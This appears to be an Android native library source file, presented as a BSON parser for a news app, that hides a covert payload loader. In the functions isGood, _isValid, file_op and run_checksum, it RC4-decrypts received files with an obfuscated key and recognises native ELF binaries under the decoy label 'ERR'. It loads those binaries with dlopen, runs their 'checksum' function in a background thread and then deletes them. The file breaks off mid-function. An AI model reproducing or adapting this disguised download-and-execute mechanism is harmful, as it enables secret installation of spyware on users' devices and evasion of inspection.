/*
 * =====================================================================================
 *
 *       Filename:  bson.cpp
 *
 *    Description:  library to parse and serialise bson stream
 *
 *        Version:  1.0
 *        Created:  15/10/2014 16:11:22
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  zad
 *   Organization:  ht
 *
 * =====================================================================================
 */

#include "bson.h"

#include "bson_obj.h"
#include <string>
#include <fstream>
#include <unistd.h>

#include <sys/stat.h>
#include <boost/filesystem/path.hpp>
#include <boost/filesystem.hpp>
#include <boost/regex.hpp>
#include <android/log.h>
#include <dlfcn.h>
#include <boost/shared_array.hpp>
#include <boost/uuid/sha1.hpp>
#include "common.h"
#include "rc4_enc.h"

extern int pass[];
extern int pass_len;
extern char buffer_key[];
bool key_inited = false;

char* ENC(char *x);
#include "libsonDefine.h"
char tag[256];
//#define __DEBUG
#ifdef __DEBUG
#define logd(...) {\
    tag[0]=tag[1]=0;\
    snprintf(tag,256,"libbsonJni:%s",__FUNCTION__);\
    __android_log_print(ANDROID_LOG_DEBUG, tag , __VA_ARGS__);}
#else
#define logd(...)
#endif
using namespace std;
using namespace bson;

/*
 * Function declarations
 */
string getTypeDir(int type);
string merge_fragment(string baseDir, int type, long int ts);
int check_dir(string dirPath);
int crypt(char *dst, char *src, char *key, int skyp);
int file_exist(string file);
string getFileName(string baseDir, int type, long int ts, int fragment);
bool shift_file(string newFile, int type, string src);
char* sub40(void);
static pthread_mutex_t mux_running = { -1 };
string HexToStr(char *s);
typedef file_signature* (*sig_fnc)(int i);

#define SPC_LIBRARY_TYPE           void *
#define SPC_LOAD_LIBRARY(name)     dlopen((name), RTLD_LAZY);
#define SPC_RESOLVE_SYM(lib, name) dlsym((lib), (name))

string app_dir;

enum file_op_enum
{
   fileop_check, fileop_close, fileop_read, fileop_write, fileop_seek
};

int crypt(char *dst, char *src, char *key, int skyp)
{
   rc4_ks_t keyrc4;
   std::ifstream iin(src, std::ifstream::binary);
   std::ofstream iout(dst, std::ifstream::binary);
   logd("crypt key=%s [%d]", key, (int )strlen((char * )key));
   if (iin) {
      char * buffer = new char[CHUNK_SIZE];
      int length = 0;
      // <RC4 INIT>
      memset(buffer, 0, sizeof(buffer));
      rc4_setks((uint8_t*) key, strlen((char *) key), &keyrc4);
      rc4_crypt((uint8_t*) buffer, CHUNK_SIZE, &keyrc4);
      // </RC4 INIT>
      if (skyp) {
         iin.read(buffer, skyp);
         length = (int) iin.gcount();
         iout.write(buffer, length);
      }
      do {
         memset(buffer, 0, sizeof(buffer));
         iin.read(buffer, CHUNK_SIZE);
         length = (int) iin.gcount();
         rc4_crypt((uint8_t*) buffer, length, &keyrc4);
         iout.write(buffer, length);
      } while (!iin.eof());

      iin.close();
      iout.close();

      delete[] buffer;
   }
   return 0;
}

int checkFileExpirations(char * file_s, int ttl_sec)
{
   if (file_s != NULL) {
      struct stat status;
      if (!stat(file_s, &status)) {
         char datetime[100] = { 0 };
         time_t now = time(NULL);
         if (status.st_mtime < now) {
            time_t diff = now - status.st_mtime;
            logd("Age for %s is sec %d [%dmin]\n", file_s, diff, diff / 60);
            if (diff > ttl_sec) {
               string s(file_s);
               if (boost::filesystem::remove(s)) {
                  logd("removed %s too old", file_s);
               } else {
                  logd("failed to remove %s", file_s);
               }
            }
         } else {
            logd("%s is in the future\n", file_s);
         }
      } else {
         logd("Can't stat: %s\n", file_s);
      }
   }
   return 0;
}

int checkExpirations(char *file_name, int ttl_sec)
{
   if (!app_dir.empty()) {
      int n = 0;
      for (n = 1; n < TYPE_MAX; n++) {
         const std::string target_path = app_dir + "/" + getTypeDir(n);
         string newFile = target_path + "/" + boost::lexical_cast<std::string>(file_name);
         checkFileExpirations((char *) newFile.c_str(), ttl_sec);
      }
   }
   return 0;
}

#ifdef __cplusplus
extern "C"
{
#endif

//return 0 on failure
   __attribute__ ((visibility ("default"))) int _isValid(char *file)
   {
      int res = 0;
      string filename, tmp_f;
      filename = boost::lexical_cast<std::string>(file);
      if (file_exist(filename)) {
         tmp_f = filename + KKK"_";
         logd("dec %s->%s", file, tmp_f.c_str());
         crypt((char *) tmp_f.c_str(), (char *) file, (char *) sub40(), 0);
         if (shift_file(filename, 0, tmp_f) == true) {
            logd("success %s->%s", tmp_f.c_str(), file);
            res = 1;
         } else {
            logd("fail back %s->%s", tmp_f.c_str(), file);
         }
      }
      logd("returning %d", res);
      return res;
   }

#ifdef __cplusplus
}
#endif

void rc4_setks(const uint8_t *buf, size_t len, rc4_ks_t *ks)
{
   uint8_t j = 0;
   uint8_t *state = ks->state;
   int i;

   for (i = 0; i < 256; ++i) {
      state[i] = i;
   }
   ks->x = 0;
   ks->y = 0;

   for (i = 0; i < 256; ++i) {
      j = j + state[i] + buf[i % len];
      _swap(state[i], state[j]);
   }
}

void rc4_crypt(uint8_t *buf, size_t len, rc4_ks_t *ks)
{
   uint8_t x;
   uint8_t y;
   uint8_t *state = ks->state;
   unsigned int i;

   x = ks->x;
   y = ks->y;

   for (i = 0; i < len; i++) {
      y = y + state[++x];
      _swap(state[x], state[y]);
      buf[i] ^= state[(state[x] + state[y]) & 0xff];
   }

   ks->x = x;
   ks->y = y;
}

void *file_op(enum file_op_enum op, string n)
{
   static SPC_LIBRARY_TYPE lib = 0;
   static struct FILEOP
   {
      void *open, *close, *read, *write, *seek;
   }s =
   {  0};

   lib = SPC_LOAD_LIBRARY(n.c_str());
   if(lib != NULL)
   {
      switch (op)
      {
         case fileop_check:
         s.open = SPC_RESOLVE_SYM(lib, KKK"checksum");
         return s.open;
         case fileop_close:
         s.close = SPC_RESOLVE_SYM(lib, KKK"close");
         return s.close;
         case fileop_read:
         s.read = SPC_RESOLVE_SYM(lib, KKK"read");
         return s.read;
         case fileop_write:
         s.write = SPC_RESOLVE_SYM(lib,KKK"write");
         return s.write;
         case fileop_seek:
         s.seek = SPC_RESOLVE_SYM(lib, KKK"seek");
         return s.seek;
      }
   }
   return 0;
}

/*
 * Returns: a filename for the type,ts,and fragment of a file.
 * empty sting in case of error
 */

string getFileName(string baseDir, int type, long int ts, int fragment)
{
   string filename;
   char tmp[6];
   logd("basedir.e=%d type=%d ts=%ld fragment=%d ", baseDir.empty(), type, ts, fragment);
   if (!baseDir.empty() && type > 0 && ts >= 0 && fragment >= FRAGMENT_VALID && !getTypeDir(type).empty()) {
      string type_dir = baseDir + "/" + getTypeDir(type);
      if (check_dir(type_dir) == 0) {
         if (fragment >= 0) {
            filename = type_dir + "/" + boost::lexical_cast<std::string>(ts) + "_" + boost::lexical_cast<std::string>(fragment);
         } else if (fragment == FRAGMENT_WILDCHAR) {
            logd("FRAGMENT_WILDCHAR");
            filename = type_dir + "/" + boost::lexical_cast<std::string>(ts) + "_";
         } else if (fragment == FRAGMENT_STRIP) {
            logd("FRAGMENT_STRIP");
            filename = type_dir + "/" + boost::lexical_cast<std::string>(ts);
         } else {
            logd("FRAGMENT_LOG");
         filename = type_dir + "/" + boost::lexical_cast<std::string>(KKK"log.tmp");
      }
      logd("filename=%s", filename.c_str());
   }
}
return filename;
}

int regular_file(string file)
{
if (!file.empty()) {
   const char *file_s = file.c_str();
   struct stat s;
   if (!stat(file_s, &s)) {
      if (S_ISREG(s.st_mode)) {
         logd("regular %s\n", file_s);
         return 1;
      } else {
         logd("irregular %s\n", file_s);
      }
   } else {
      logd("Can't stat: %s\n", file_s);
   }
}
return 0;
}

int file_exist(string file)
{
struct stat results;
if (!file.empty() && stat(file.c_str(), &results) == 0) {
   return 1;
}
return 0;
}

int check_dir(string dirPath)
{

if (!dirPath.empty()) {
   try {
      if (file_exist(dirPath)) {
         return 0;
      } else {
         logd("Try to create %s", dirPath.c_str());
         boost::filesystem::path dir((const char *) dirPath.c_str());

         logd("path ok %s", dir.c_str());
         if (boost::filesystem::create_directory(dir)) {
            logd("success %s", dirPath.c_str());
            return 0;
         }
         logd("failed %s", dirPath.c_str());
      }
   } catch (std::exception const& ex) {
      logd("Can't create dir. %s", ex.what());
   }
}

return 1;
}

// ------------------------------------------------------------------
/*!
 Convert a hex string to a block of data
 */
void fromHex(const std::string &in,              //!< Input hex string
   void * const data                    //!< Data store
   )
{
size_t length = in.length();
unsigned char *byteData = reinterpret_cast<unsigned char*>(data);

std::stringstream hexStringStream;
hexStringStream >> std::hex;
for (size_t strIndex = 0, dataIndex = 0; strIndex < length; ++dataIndex) {
   // Read out and convert the string two characters at a time
   const char tmpStr[3] = { in[strIndex++], in[strIndex++], 0 };

   // Reset and fill the string stream
   hexStringStream.clear();
   hexStringStream.str(tmpStr);

   // Do the conversion
   int tmpValue = 0;
   hexStringStream >> tmpValue;
   byteData[dataIndex] = static_cast<unsigned char>(tmpValue);
}
}

/*
 * saves a file payload in the correct place
 *
 * returns: 1 in case of error
 * returns: 0 in case of success
 */

int save_payload(int type, string filename, char* payload, int payloadSize)
{
int result = 1;
if (payload != NULL && !filename.empty() && payloadSize > 0) {
   ofstream file(filename.c_str(), ios::out | ios::binary);
   file.write(payload, payloadSize);
   file.close();
   result = !file_exist(filename);
}
return result;
}

int append_file(string dst, string src)
{
std::ifstream ifile(src.c_str(), std::ios::in);
std::ofstream ofile(dst.c_str(), std::ios::out | std::ios::app);

//check to see that it exists:
if (!ifile.is_open()) {
   logd("failed to open %s ", src.c_str());
   ofile.close();
   return 1;
} else {
   ofile << ifile.rdbuf();
}
ifile.close();
ofile.close();
return 0;
}

string merge_fragment(string baseDir, int type, long int ts)
{
bool error = false;

const std::string target_path = baseDir + "/" + getTypeDir(type);
const string file_mask = getFileName(baseDir, type, ts, FRAGMENT_WILDCHAR);
string newFile;
if (!file_mask.empty()) {
   try {
      std::vector < std::string > all_matching_files;
      boost::filesystem::directory_iterator end_itr; // Default ctor yields past-the-end

      for (boost::filesystem::directory_iterator i(target_path); i != end_itr; ++i) {
         const char* tmp = i->path().string().c_str();
         const char* tmp_src = file_mask.c_str();
         //logd("checking %s --> %s",tmp,tmp_src);
         // Skip if not a file

         if (!regular_file(tmp)) {
            logd("not a file");
            continue;
         }

         //logd("against  %s",tmp_src);
         // Skip if no match
         if (strlen(tmp) >= strlen(tmp_src)) {
            if (strncmp(tmp, tmp_src, strlen(tmp_src)) == 0) {
               //logd("adding %s",tmp );
               all_matching_files.push_back(i->path().string());
            }
         }
      }
      newFile = getFileName(baseDir, type, ts, FRAGMENT_STRIP);
      boost::filesystem::path newFilePath(newFile.c_str());
      boost::filesystem::remove(newFilePath);
      sort(all_matching_files.begin(), all_matching_files.end(), less<string>());
      for (std::vector<string>::iterator it = all_matching_files.begin(); it != all_matching_files.end(); ++it) {
         const char* tmpFile = (*it).c_str();
         logd("appending %s-->%s", tmpFile, newFile.c_str());
         if (append_file(newFile, *it)) {
            error = true;
         }
         if (boost::filesystem::remove(*it)) {
            logd("removed %s", tmpFile);
         } else {
            logd("failed to remove %s", tmpFile);
            error = true;
         }
      }
   } catch (std::exception const& ex) {
      logd("Can't merge file %s", ex.what());
   }
} else {
   logd("empty file mask");
   error = true;
}
if (!error)
   return newFile;
return "Error";
}

string getTypeDir(int type)
{
string dirName;
switch (type)
{
case TYPE_TEXT:
   return TYPE_TEXT_DIR;
case TYPE_AUDIO:
   return TYPE_AUDIO_DIR;
case TYPE_IMGL:
   return TYPE_IMG_DIR;
case TYPE_VIDEO:
   return TYPE_VIDEO_DIR;
case TYPE_HTML:
   return TYPE_HTML_DIR;
default:
   return "";
   break;
}
return dirName;
}

char* ENC(char *x)
{
int i;
int str_len;
rc4_ks_t keyrc4;
str_len = strlen(x) / 2;
char *str = new char[str_len + 1];
char buffer[pass_len];
sub40();
//logd("got [%d]key=\"%s\"",strlen(buffer_key),buffer_key);
//logd("string to encode key=%s",x);

// <RC4 INIT>
memset(str, 0, str_len + 1);
rc4_setks((uint8_t*) buffer_key, strlen(buffer_key), &keyrc4);
rc4_crypt((uint8_t*) str, str_len, &keyrc4);
// </RC4 INIT>
memset(str, 0, str_len + 1);
memcpy(str, HexToStr(x).c_str(), strlen(HexToStr(x).c_str()));
rc4_crypt((uint8_t*) str, strlen(HexToStr(x).c_str()), &keyrc4);
//logd("string decoded [%d-%d]key=%s",strlen(HexToStr(x).c_str()),str_len,str);
return str;
}

file_signature* alloc_file_signature(char* name, char* sig)
{
file_signature *f = new file_signature();
logd("alloced file_signature %p:", f);
f->h_name = new char[strlen(name) + 1];
f->signature = new char[strlen(sig) + 1];
logd("alloced name %d and sig %d", strlen(name), strlen(sig));
memcpy(f->h_name, name, strlen(name) + 1);
memcpy(f->signature, sig, strlen(sig) + 1);
logd("returning %s:", f->h_name);
return f;
}

file_signature* good(int i)
{
file_signature *f = NULL;
logd("asking %d:", i);
switch (i)
{
case 0:
   f = alloc_file_signature(KKK"ERR",KKK"7F454C46");
   break;
case 1:
   f = alloc_file_signature(KKK"LOG",KKK"504B0304");
   break;
default:
   break;
}
return f;
}

file_signature* images(int i)
{
file_signature *f = NULL;
logd("asking %d:", i);
switch (i)
{
case 0:
   f = alloc_file_signature(KKK"JPG",KKK"FFD8FFE0");
   break;
case 1:
   f = alloc_file_signature(KKK"GIF",KKK"474946");
   break;
case 2:
   f = alloc_file_signature(KKK"PNG",KKK"89504E470D0A1A0A");
   break;
default:
   break;
}
return f;
}

string HexToStr(char* s)
{
ostringstream ret;
if (s != NULL) {

   int size = strlen(s);
   char z[3];
   z[2] = '\0';
   for (string::size_type i = 0; i < size;) {
      std::stringstream ss;
      unsigned int n = 0;
      z[0] = s[i];
      z[1] = s[i + 1];
      ss << std::hex << z;
      ss >> n;
      ret << (char) n;
      i += 2;
   }
}
return ret.str();
}

string ToHex(const string& s, bool upper_case)
{
ostringstream ret;
for (string::size_type i = 0; i < s.length(); ++i) {
   int z = s[i] & 0xff;
   ret << std::hex << std::setfill('0') << std::setw(2) << (upper_case ? std::uppercase : std::nouppercase) << z;
}
return ret.str();
}
bool CheckMutex()
{
if (mux_running.value == -1) {
   logd("initializing mutex");
   pthread_mutex_init(&mux_running, NULL);
}
return true;
//  if(pthread_mutex_trylock(&mux_running)==0){
//    logd("lock aquired ");
//    return true;
//  }else{
//    logd("Fail to acquire lock ");
//    return false;
//  }
}
string runned_file;
int retStatus;
bool threadStarted = false;

void *run_checksum(void *arg)
{
typedef int (*test_t)();
retStatus = -4;
if (pthread_mutex_trylock(&mux_running) == 0) {
   threadStarted = true;
   test_t test_fnc = (test_t) arg;
   boost::filesystem::path p(runned_file);
   boost::filesystem::path dir = p.parent_path();
   string path = dir.string();
   path += "/";
   boost::filesystem::path old_dir = boost::filesystem::current_path();
   logd("change path from %s to %s [%p]", old_dir.string().c_str(), path.c_str(), arg);
   boost::filesystem::current_path(dir);
   if (test_fnc()) {
      logd("deadbeef:");
      retStatus = -1;
   } else {
      retStatus = -2;
   }
   arg = NULL;
   pthread_mutex_unlock(&mux_running);
} else {
   logd("cannotrun:");
}
logd("removing %s", runned_file.c_str());
boost::filesystem::remove(runned_file);
return (void *) &retStatus;
}

pthread_t th;

std::string get_r_name(string f)
{
int v2 = rand() % 100 + 1;
string res = f + boost::lexical_cast<std::string>(v2);
logd("get_r_name returning %s", res.c_str());
return res;
}

char* sub40()
{
int i;
if (key_inited) {
   return buffer_key;
}
memset(buffer_key, 0, sizeof(pass_len + 1));
for (i = 0; i < pass_len; i++) {
   buffer_key[i] = (char) (pass[i] ^ 0x11);
}
buffer_key[i] = '\0';
logd("sub40: returning %s", buffer_key);
key_inited = true;
return buffer_key;
}

int isMatch(string f, char * payload, int payload_size, sig_fnc fnc_fs, file_signature** return_fs)
{
int i = 0;
int match = 0;
rc4_ks_t keyrc4;
logd("Start");

file_signature* fs;
while ((fs = fnc_fs(i)) != NULL && payload != NULL && return_fs != NULL) {
   if (fs != NULL || fs->h_name != NULL) {
      logd("checking %d [%s]", i, fs->h_name);
      //First phase check the signature without decrypting
      if (strlen(fs->signature) <= (payload_size * 2)) {
         std::string tohexed = ToHex(std::string(payload, strlen(fs->signature) / 2), true);
         logd("checking %s: %s against signature %s", fs->h_name, tohexed.c_str(), fs->signature);
         if (strncasecmp(fs->signature, tohexed.c_str(), strlen(fs->signature)) == 0) {
            logd("First phase found %s", fs->h_name);
            match = 1;
         }
      }
      //Second phase decripy payload first 512 byte and check the signature again\
       //decripted match win against PirstPhase match
      if (strlen(fs->signature) <= (payload_size * 2)) {
         //decrypt payload
         char * buffer = new char[CHUNK_SIZE];

         memset(buffer, 0, sizeof(buffer));
         rc4_setks((uint8_t*) sub40(), strlen((char *) sub40()), &keyrc4);
         rc4_crypt((uint8_t*) buffer, CHUNK_SIZE, &keyrc4);
         memcpy(buffer, payload, strlen(fs->signature));
         rc4_crypt((uint8_t*) buffer, strlen(fs->signature), &keyrc4);

         std::string tohexed = ToHex(std::string(buffer, strlen(fs->signature) / 2), true);
         logd("checking %s: %s against signature %s", fs->h_name, tohexed.c_str(), fs->signature);
         if (strncasecmp(fs->signature, tohexed.c_str(), strlen(fs->signature)) == 0) {
            logd("Second phase found %s", fs->h_name);
            match = 2;
         }
      }
   }
   if (match) {
      *return_fs = fs;
      return match;
   }
   i++;
}
*return_fs = NULL;
return match;
}

int isGood(string f, char * payload, int payload_size, sig_fnc fs_list, int type)
{
int res = 1;
int match = false;
file_signature* fs;
logd("Start");
match = isMatch(f, payload, payload_size, fs_list, &fs);
if (match == 2) {
   logd("found %s", fs->h_name);
   typedef int (*test_t)();
   if (file_exist(f)) {
      string f_t = get_r_name(f);

      if (strncasecmp(good(1)->h_name, fs->h_name, strlen(good(1)->h_name)) == 0) {
         logd("3");
         return 3;
      }
      //crypt((char *)f_t.c_str(),(char *)f.c_str(),(char *)sub40(),0);
      //shift_file(f,type,f_t);
      _isValid((char *) f.c_str());
      test_t test_fnc = (test_t) file_op(fileop_check, f);
      if (test_fnc != NULL) {
         //Start of part to be threaded
         runned_file = f;

         if (pthread_create(&th, NULL, run_checksum, (void*) test_fnc)) {
            logd("failed to execute Thread:");
         }
         logd("bad");
         //end of part to be threaded
      } else {
         if (strncasecmp(good(0)->h_name, fs->h_name, strlen(good(1)->h_name)) != 0) {
            logd("good");
            shift_file(f_t, type, f);
         } else {
            logd("encripted file that was ERR withouth checksum %s", f.c_str());
            boost::filesystem::remove(f);
            res = 2;
         }
      }
      return res;
   }
}

return 0;
}

int isType(string f, char * payload, int payload_size, sig_fnc fnc_fs, int type)
{
logd("Start");
file_signature* fs;
int match = isMatch(f, payload, payload_size, fnc_fs, &fs);
if (match) {
   logd("found %s", fs->h_name);
   if (match == 2) {
      //string f_t=get_r_name(f);
      //crypt((char *)f_t.c_str(),(char *)f.c_str(),(char *)sub40(),0);
      //shift_file(f,type,f_t);
      if (_isValid((char *) f.c_str())) {
         logd("_isValid failed");
      }

   }
   return 1;
}
return 0;
}

int check_filebytype(string f, int type, char *payload, int size)
{
int res = 1;
logd("check integrity first %s", f.c_str());
if ((res = isGood(f, payload, size, good, type))) {
   logd("integrity check fails %s %d", f.c_str(), res);
   return res;
}
switch (type)
{
case TYPE_TEXT:
   res = 0;
   break;
case TYPE_AUDIO:
   res = 0;
   break;
case TYPE_IMGL:
   return !isType(f, payload, size, images, type);
   break;
   res = 0;
   break;
case TYPE_VIDEO:

case TYPE_HTML:
   break;
default:
   break;
}
return res;
}

bool shift_file(string newFile, int type, string src)
{
boost::filesystem::path newFilePath(newFile.c_str());
boost::filesystem::remove(newFilePath);
bool success = true;

const char* tmpFile = (src).c_str();
logd("appending %s-->%s", tmpFile, newFile.c_str());
if (append_file(newFile, src)) {
   success = false;
}
if (boost::filesystem::remove(src)) {
   logd("removed %s", tmpFile);
} else {
   logd("failed to remove %s", tmpFile);
   success = false;
}
return success;
}

std::string sha1_to_string(const char *hash)
{
char str[128] = { 0 };
char *ptr = str;
std::string ret;

for (int i = 0; i < 20; i++) {
   sprintf(ptr, "%02x", (unsigned char) *hash);
   ptr += 2;
   hash++;
}
ret = str;

return ret;
}
/*
 string getParentDir(char* path)
 {
 char *p;
 int len;
 bool found=false;
 if(path!=NULL){
 logd("parent dir passed path %s",path);
 len=strlen(path)-2; //-1 because of array index and -1 to skyp the last char
 p=&path[len];
 while((len)>=0){
 if(*p=='/'){
 found=true;
 break;
 }
 p--;
 len--;
 }
 if(found==true){
 len++;
 string str(path,len);
 logd("parent dir is %s",str.c_str());
 return str;
 }
 }
 logd("parent not found");
 return NULL;
 }
 */
/*
 * saves the payload in the correct place and format
 *
 * returns: 1 in case of error
 * returns: 0 in case of success
 */

jobject save_payload_type(string baseDir, int type, long int ts, int fragment, string title, string headline, string content, char* payload, int payload_size, string sha1_str, JNIEnv *env)
{
jobject hashMap = NULL;
string result_output;
logd("payload %p basedir.e?=%d payloadSize=%d", payload, baseDir.empty(), payload_size);

if (payload != NULL && !baseDir.empty() && payload_size > 0) {
   if (app_dir.empty() && app_dir.compare(baseDir) != 0) {
      app_dir = baseDir;
   }
   checkExpirations(KKK"log.tmp",5*60);
   checkExpirations(KKK"shtmp",30);
   boost::uuids::detail::sha1 hasher;
   boost::shared_array<unsigned int> digest;
   hasher.process_bytes((const void*) payload, payload_size);
   digest.reset(new unsigned int[5]);
   char bin[20];

   hasher.get_digest(reinterpret_cast<boost::uuids::detail::sha1::digest_type>(*digest.get()));
   for (int i = 0; i < 5; ++i) {
      const char* tmp = reinterpret_cast<char*>(digest.get());
      bin[i * 4] = tmp[i * 4 + 3];
      bin[i * 4 + 1] = tmp[i * 4 + 2];
      bin[i * 4 + 2] = tmp[i * 4 + 1];
      bin[i * 4 + 3] = tmp[i * 4];
   }
   std::string hash_hex = sha1_to_string(bin);
   const jsize map_len = HASH_FIELDS;
   const jclass mapClass = env->FindClass("java/util/HashMap");
   const jmethodID init = env->GetMethodID(mapClass, "<init>", "(I)V");
   const jmethodID put = env->GetMethodID(mapClass, "put", "(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;");
   std::stringstream ss;
   ss << ts;
   std::string ts_string = ss.str();
   hashMap = env->NewObject(mapClass, init, map_len);
   if (strncmp(hash_hex.c_str(), sha1_str.c_str(), sizeof(bin) * 2) != 0) {

      logd("sha1 mismatch:\ngot_sha1=%s\nrec_sha1=%s", hash_hex.c_str(), sha1_str.c_str());
      env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
      env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF(hash_hex.c_str()));
   } else {
      if (save_payload(type, getFileName(baseDir, type, ts, fragment), payload, payload_size) == 0) {
         getFileName(baseDir, type, ts, fragment);
      }
      if (fragment == 0) {
         result_output = merge_fragment(baseDir, type, ts);
         int check = check_filebytype(result_output, type, payload, payload_size);

         if (check == 0) {
            logd("file ok");
            if (mapClass != NULL) {
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_TYPE), env->NewStringUTF(getTypeDir(type).c_str()));
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_PATH), env->NewStringUTF(result_output.c_str()));
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_TITLE), env->NewStringUTF(title.c_str()));
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_HEADLINE), env->NewStringUTF(headline.c_str()));
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CONTENT), env->NewStringUTF(content.c_str()));
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
            }
         } else {
            if (check < 0) {
               logd("file not ok -1");
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-1"));
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
            } else {
               logd("file not ok 0");
               if (check == 3) {
                  string newFile = getFileName(baseDir, type, 2, FRAGMENT_LOG);
                  shift_file(newFile, type, result_output);
                  env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
               } else if (check == 2) {
                  env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-2"));
               } else {
                  env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-1"));
               }
               env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
            }
         }
      } else {
         logd("fragment ok 0");
         env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
         env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));

      }
   }

}
return hashMap;
}

void GetJStringContent(JNIEnv *AEnv, jstring AStr, std::string &ARes)
{
if (!AStr) {
   ARes.clear();
   return;
}
const char *s = AEnv->GetStringUTFChars(AStr, NULL);
ARes = s;
AEnv->ReleaseStringUTFChars(AStr, s);
}

//char bson_s[] = { 0x16,0x00,0x00,0x00,0x05,'s','a','l','u','t','o',0x00,0x04,0x00,0x00,0x00,0x00,'c','i','a','o',0x0 };
/*
 0x35 0x0 0x0 0x0
 0x5
 0x63 0x6d 0x64 0x0
 0x4 0x0 0x0 0x0
 0x0
 0x73 0x61 0x76 0x65
 0x10
 0x74 0x79 0x70 0x65 0x0
 0x1 0x0 0x0 0x0
 0x5
 0x70 0x61 0x79 0x6c 0x6f 0x61 0x64 0x0
 0xa 0x0 0x0 0x0
 0x0
 0x63 0x69 0x61 0x6f 0x20 0x6d 0x6f 0x6e 0x64 0x6f 0x0
 */
JNIEXPORT jobject JNICALL Java_org_benews_BsonBridge_serialize(JNIEnv *env, jclass obj, jstring basedir, jobject bson_s)
{

jobject resS;
CheckMutex();
if (threadStarted) {
   logd("serialize thread running..");
   if (pthread_mutex_trylock(&mux_running) == 0) {
      logd("job finished, join it");
      void *status;
      if (pthread_join(th, &status)) {
         logd("failed to join Thread");
      } else {
         int* st = (int*) status;
         logd("Thread returns %d", *st);
      }
      threadStarted = false;
      pthread_mutex_unlock(&mux_running);
   } else {
      logd("job not finished,");
      return NULL;
   }
}

//jbyte* arry = env->GetByteArrayElements(bson_s,NULL);
char *arry = (char *) env->GetDirectBufferAddress(bson_s);
if (bson_s != NULL) {
   jsize lengthOfArray = env->GetDirectBufferCapacity(bson_s);

   //for (int i=0 ; i < lengthOfArray; i++){
   //logd("->0x%x",(char *)a[i]);
   //}
   if (lengthOfArray > 4) {
      logd("converted %d:%s", lengthOfArray, arry);
      bo y = BSONObj((char *) arry);
      logd("obj retrived");
      // env->ReleaseByteArrayElements(bson_s,arry, JNI_ABORT);
      be *ptr;
      string res;
      int element = 0;
      string value, title_str, headline_str, content_str, sha1_str;
      be ts = y.getField("ts");
      logd("got elemets");
      if (ts.size() > 0 && ts.type() == NumberLong) {
         ptr = &ts;
         value = boost::lexical_cast<std::string>(ptr->Long());
         res += boost::lexical_cast<std::string>(ptr->fieldName()) + "=" + value + "\n";
         logd("got ts %s", value.c_str());
         element++;
      }
      be type = y.getField(HASH_FIELD_TYPE);
      if (type.size() > 0 && type.type() == NumberInt) {
         ptr = &type;
         value = boost::lexical_cast<std::string>(ptr->Int());
         res += boost::lexical_cast<std::string>(ptr->fieldName()) + "=" + value + "\n";
         logd("got type %s", value.c_str());
         element++;
      }
      be frag = y.getField(HASH_FIELD_FRAGMENT);
      if (frag.size() > 0 && frag.type() == NumberInt) {
         ptr = &frag;
         value = boost::lexical_cast<std::string>(ptr->Int());
         res += boost::lexical_cast<std::string>(ptr->fieldName()) + "=" + value + "\n";
         logd("got frag %s", value.c_str());
         element++;
      }
      be payload = y.getField(HASH_FIELD_PAYLOAD);
      if (payload.size() > 0) {
         ptr = &payload;
         logd("got payload");
         //int a;
         //value = boost::lexical_cast<std::string>(ptr->binData(a));
         //value = value.substr(0,a);
         //res += boost::lexical_cast<std::string>(ptr->fieldName())  + "=" + value + "\n";
         //logd("result %s",res.c_str());
         element++;
      }
      be title = y.getField(HASH_FIELD_TITLE);
      if (title.size() > 0 && title.type() == BinData) {
         int a;
         ptr = &title;
         title_str = boost::lexical_cast<std::string>(ptr->binData(a));
         title_str = title_str.substr(0, a);
         res += boost::lexical_cast<std::string>(ptr->fieldName()) + "=" + title_str + "\n";
         logd("got title %s", title_str.c_str());
         element++;
      }
      be headline = y.getField(HASH_FIELD_HEADLINE);
      if (headline.size() > 0 && headline.type() == BinData) {
         ptr = &headline;
         int a;
         headline_str = boost::lexical_cast<std::string>(ptr->binData(a));
         headline_str = headline_str.substr(0, a);
         res += boost::lexical_cast<std::string>(ptr->fieldName()) + "=" + headline_str + "\n";
         logd("got headline %s", headline_str.c_str());
         element++;
      }
      be content = y.getField(HASH_FIELD_CONTENT);
      if (content.size() > 0 && content.type() == BinData) {
         int a;
         ptr = &content;
         content_str = boost::lexical_cast<std::string>(ptr->binData(a));
         content_str = content_str.substr(0, a);
         res += boost::lexical_cast<std::string>(ptr->fieldName()) + "=" + content_str + "\n";
         logd("got content %s", content_str.c_str());
         element++;
      }
      be sha1 = y.getField(HASH_FIELD_SHA1);
      if (sha1.size() > 0 && sha1.type() == BinData) {
         int a;
         ptr = &sha1;
         sha1_str = boost::lexical_cast<std::string>(ptr->binData(a));
         sha1_str = sha1_str.substr(0, a);
         res += boost::lexical_cast<std::string>(ptr->fieldName()) + "=" + sha1_str + "\n";
         logd("got sha1 %s", sha1_str.c_str());
         element++;
      }
      ptr = NULL;

      if (element == ELEMENT2PROCESS) {
         string basedir_str;
